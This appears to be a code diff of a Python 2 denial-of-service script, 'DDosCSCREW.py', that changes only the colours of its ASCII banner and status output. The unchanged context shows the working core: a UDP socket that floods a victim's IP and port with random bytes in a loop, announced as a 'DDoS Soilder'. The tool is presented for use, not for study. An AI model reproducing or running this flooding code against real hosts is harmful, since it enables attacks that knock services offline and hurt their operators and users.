@@ -3,14 +3,14 @@ import socket
 import random
 import sys
 def usage():
-    print "  ######   ######   ######  ########  ######## ##      ## "
-    print " ##    ## ##    ## ##    ## ##     ## ##       ##  ##  ## "
-    print " ##       ##       ##       ##     ## ##       ##  ##  ## "
-    print " ##        ######  ##       ########  ######   ##  ##  ## "
-    print " ##             ## ##       ##   ##   ##       ##  ##  ## "
-    print " ##    ## ##    ## ##    ## ##    ##  ##       ##  ##  ## "
-    print "  ######   ######   ######  ##     ## ########  ###  ###  "
-    print "  -------python2 DDosCSCREW.py <ip> <port> <packet>------- "
+    print "\033[1;90m  ######   ######   ######  ########  ######## ##      ## "
+    print "\033[1;90m ##    ## ##    ## ##    ## ##     ## ##       ##  ##  ## "
+    print "\033[1;90m ##       ##       ##       ##     ## ##       ##  ##  ## "
+    print "\033[1;90m ##        ######  ##       ########  ######   ##  ##  ## "
+    print "\033[1;90m ##             ## ##       ##   ##   ##       ##  ##  ## "
+    print "\033[1;90m ##    ## ##    ## ##    ## ##    ##  ##       ##  ##  ## "
+    print "\033[1;90m ######   ######   ######  ##     ## ########  ###  ###  "
+    print "\033[1;97m -------python2 DDosCSCREW.py <ip> <port> <packet>------- "
 def flood(victim, vport, duration):
     
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -25,7 +25,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mStart \033[1;32m%s \033[1;91mDDoS Soilder sended \033[1;32m%s \033[1;91mBy Port \033[1;32m%s" % (sent, victim, vport)
+        print "\033[1;90mStart \033[1;97m%s \033[1;90mDDoS Soilder sended \033[1;97m%s \033[1;90mBy Port \033[1;97m%s" % (sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
